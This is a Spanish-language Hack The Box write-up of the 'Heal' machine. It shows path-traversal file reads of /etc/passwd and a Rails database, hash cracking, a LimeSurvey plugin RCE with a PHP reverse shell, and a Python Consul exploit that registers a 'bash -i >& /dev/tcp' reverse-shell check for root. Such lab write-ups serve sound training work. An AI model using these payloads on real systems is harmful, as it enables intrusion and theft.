---
title: Heal - Hackthebox - Season7
date: 2025-01-24 00:00:00 +0000
categories: [Labs & CTF, Write Up, Hackthebox]
tags: [Linux, CTF] 
image:
  path: /assets/img/posts/heal_htb/cabecera.png
  alt: Heal
description: >
  Heal Guia en español
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
sudo nmap -p- -sVC -sC --open -sS -n -Pn 10.10.11.46
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 13:50 CET
Nmap scan report for 10.10.11.46
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
```

## Servicio web en el puerto 80

Si nos dirigimos a la web que está sirviendo podremos ver lo que parece un creador de CV.
Vamos a crear una cuenta.

[![CV](/assets/img/posts/heal_htb/login.png)](/assets/img/posts/heal_htb/login.png)

> **Advertencia**: Si salta error al intentar crear la cuenta es posible que tengas que añadir el dominio al archivo hosts. Si abres las devtools de tu navegador podrás ver el error que nos dice que el no puede conectarse al dominio.
{: .prompt-warning }

Una vez dentro vamos a investigar un poco y en una de las pestañas encontramos el mail de un administrador.

[![CV](/assets/img/posts/heal_htb/login1.png)](/assets/img/posts/heal_htb/login1.png)

> **Nota**: Recuerda añadir los dominios al archivo hosts.
{: .prompt-info }

```bash
10.10.11.46 heal.htb api.heal.htb take-survey.heal.htb
```
Si ahora navegamos a ese subdominio podemos ver un mensaje interesante.

[![survey](/assets/img/posts/heal_htb/survey.png)](/assets/img/posts/heal_htb/survey.png)

### Analizando el subdominio

Mientras investigamos el resto de funciones de la web podemos analizar los directorios tanto del dominio principal como del subdominio.

```bash
gobuster dir -u http://take-survey.heal.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

[![gobuster](/assets/img/posts/heal_htb/gobuster.png)](/assets/img/posts/heal_htb/gobuster.png)

### Panel de administración LimeSurvey

LimeSurvey es una aplicación web de código abierto diseñada para crear, administrar y analizar encuestas en línea.
Por ahora tenemos el correo de un administrador y el subdominio de la encuesta.

[![adminlogin](/assets/img/posts/heal_htb/adminlogin.png)](/assets/img/posts/heal_htb/adminlogin.png)

### api.heal.htb

Tambíen vamos a analizar el subdominio de la API por si hubiera algo interesante.

[![api](/assets/img/posts/heal_htb/api.png)](/assets/img/posts/heal_htb/api.png)

Aquí vemos información que podría ser interesante.

    Rails version: 7.1.4
    Ruby version: ruby 3.3.5 (2024-09-03 revision ef084cc8f4) [x86_64-linux]

### Exportando un CV

Para seguir con la investigación también podemos intentar exportar un CV de los que permite la web.

¿Y si interceptamos la petición de descarga y vemos que parámetros usa?

[![burp](/assets/img/posts/heal_htb/burpsuite_1.png)](/assets/img/posts/heal_htb/burpsuite_1.png)

Parece usar un token JWT para autenticar el usuario y generar el CV para descargar.

Podemos probar un ataque LFI?

## Ataque LFI (Local File Inclusion)

Vamos a ver el rastro de peticiones

[![burp](/assets/img/posts/heal_htb/peticiones.png)](/assets/img/posts/heal_htb/peticiones.png)

Parece que tras llamar a la exportación del pdf lo almacena en una ruta /downloads donde indica el nombre del fichero

Tras un rato probando la ruta relativa he conseguido realizar un LFI modificando la petición de la siguiente manera.

[![burp](/assets/img/posts/heal_htb/peticionmod.png)](/assets/img/posts/heal_htb/peticionmod.png)

1. **Cambiamos de OPTIONS a GET**
2. **Necesitamos autenticar la petición ya que de lo contrario no la realiza**
    - Para esto podemos copiar el token de las peticiones export por ejemplo y pegarlo en las cabeceras
3. **Ubicamos la ruta relativa de la carpeta downloads de la API para poder acceder al contenido deseado**

Ahora si podemos extraer contenido de ficheros en el servidor

```bash

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

## Extrayendo información

Ahora que tenemos el poder de extraer datos del servidor, ¿por qué no hacerlo con algunos archivos de configuración?

Bien, sabemos que la web hace uso de la API Rails 7.1.4 por lo que buscando por internet vamos a ver las ubicaciones y nombres de los archivos de configuración.


### Rails Application Configuration
- `config/application.rb`
- `config/environment.rb`
- `config/environments/production.rb`  
- `config/environments/development.rb`
- `config/environments/test.rb`
- `config/database.yml`
- `config/secrets.yml`
- `config/credentials.yml.enc`
- `config/master.key`
- `config/routes.rb`
- `config/storage.yml`

De aquí podemos ir viendo el contenido de cada uno de ellos, pero el que más nos interesa es el archivo `config/database.yml` ya que es donde se guarda la configuración de la base de datos.

[![infodatabase](/assets/img/posts/heal_htb/infodatabase.png)](/assets/img/posts/heal_htb/infodatabase.png)

Tenemos las ubicaciones de las diferentes bases de datos de Rails. 

Vamos a descargar la base de datos de development, que es la que se utiliza en el entorno de desarrollo.

```bash
wget --header="Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjozfQ.CZbGMyPLgTWm9p2lPa9pGZ0vGQ0qKgr7RG4kj1tUSGc" http://api.heal.htb/download?filename=../../storage/development.sqlite3 -O development.sqlite3
```

[![infodatabase](/assets/img/posts/heal_htb/infodatabase2.png)](/assets/img/posts/heal_htb/infodatabase2.png)

Ahora que hemos conseguido el hash de la contraseña para ralph podemos crackearla con John

[![cracked](/assets/img/posts/heal_htb/cracked.png)](/assets/img/posts/heal_htb/cracked.png)

## Panel de administración LimeSurvey

Ahora podemos acceder al panel de administración.

Dentro encontramos la versión y buscando por internet podemos encontrar un exploit para ejecutar codigo remoto.

[![panel](/assets/img/posts/heal_htb/paneladminver.png)](/assets/img/posts/heal_htb/paneladminver.png)

### Exploit

[Exploit](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE)

Antes de ejecutar el exploit, hay que modificar la verisón en el config.xml

[![panel](/assets/img/posts/heal_htb/configxml.png)](/assets/img/posts/heal_htb/configxml.png)

> **Nota**: También hay que modificar la IP en el archivo php-rev y el puerto hacia nuestra máquina.
{: .prompt-info }

Con ambos archivos modificados, necesitamos crear un zip con el nombre del mismo que existe en el repositorio.

[![panel](/assets/img/posts/heal_htb/zip.png)](/assets/img/posts/heal_htb/zip.png)

Ahora desde el panel de administración debemos subir el zip como si fuera un plugin.

[![panel](/assets/img/posts/heal_htb/admin2.png)](/assets/img/posts/heal_htb/admin2.png)

[![panel](/assets/img/posts/heal_htb/admin3.png)](/assets/img/posts/heal_htb/admin3.png)

[![panel](/assets/img/posts/heal_htb/admin4.png)](/assets/img/posts/heal_htb/admin4.png)

Para poder instalar el plugin debemos hacer uso del exploit del repositorio descargado.

Antes de ejecutar el exploit, hay que hubicar el id del plugin que queremos instalar.

[![panel](/assets/img/posts/heal_htb/pluginactivate.png)](/assets/img/posts/heal_htb/pluginactivate.png)

### Shell reversa

Ahora que tenemos el plugin instalado podemos obtener la shell reversa navegando a la ruta `http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php`

[![shell](/assets/img/posts/heal_htb/shell.png)](/assets/img/posts/heal_htb/shell.png)

La estabilizamos 

[![shell](/assets/img/posts/heal_htb/estabilizado.png)](/assets/img/posts/heal_htb/estabilizado.png)

```bash
export TERM=xterm
```
## Movimiento lateral

Una vez dentro vamos a descargar linpeas desde nuestra máquina para poder ejecutarlo.

> **Nota**: Para que el usuario tenga permisos de escritura y ejecución debemos dirigirnos a la ruta /tmp
{: .prompt-info}

[![linpeas](/assets/img/posts/heal_htb/execlipeas.png)](/assets/img/posts/heal_htb/execlipeas.png)

Parece que hay algunas contraseñas hardcodeadas en los ficheros de configuración.

[![linpeas](/assets/img/posts/heal_htb/linpasswd.png)](/assets/img/posts/heal_htb/linpasswd.png)

Como antes ya conseguimos la lista de usuarios podemos intentar iniciar sesión con alguno de ellos y las credenciales que acabamos de encontrar.

[![linpeas](/assets/img/posts/heal_htb/suron.png)](/assets/img/posts/heal_htb/suron.png)

## Escalada de privilegios

Viendo que puertos tiene la máquina abiertos podemos hacer un port forwarding para acceder a ellos desde nuestra máquina.

[![linpeas](/assets/img/posts/heal_htb/puertos.png)](/assets/img/posts/heal_htb/puertos.png)

### Port Forwarding

```bash
ssh -L 8500:localhost:8500 ron@heal.htb
```
De todos los puertos este es el más útil que encontré.

[![consul](/assets/img/posts/heal_htb/consul.png)](/assets/img/posts/heal_htb/consul.png)

Consul es un software de HashiCorp que proporciona:

1. Descubrimiento de servicios - Permite que los servicios se registren y encuentren entre sí
2. Configuración distribuida - Almacena y distribuye configuraciones entre servicios
3. Monitoreo de salud - Verifica el estado de los servicios
4. Segmentación de red - Controla el tráfico entre servicios

Se usa principalmente en arquitecturas de microservicios y entornos cloud para gestionar la comunicación y configuración de servicios distribuidos.

Funciona con un modelo cliente-servidor y utiliza un almacén de datos key-value distribuido para mantener la información.

### Consul exploit

[Exploit-DB](https://www.exploit-db.com/exploits/51117)

Buscando encontramos un exploit para consul que permite ejecutar una shell reversa como administrador.

Como en este caso es un servicio local y el usuario ya se encuentra autenticado hay que modificar el exploit para que no tome este token.

```python
import requests, sys

if len(sys.argv) < 5:
   print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport>\n")
   exit(1)

target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}

try:
   requests.put(target, json=json)
   print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
except:
   print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")
```
[![consul](/assets/img/posts/heal_htb/consulexploit.png)](/assets/img/posts/heal_htb/consulexploit.png)

## Root shell

> **Nota**: Recuerda iniciar el puerto de escucha en tu máquina local.
{: .prompt-info }

[![root](/assets/img/posts/heal_htb/root.png)](/assets/img/posts/heal_htb/root.png)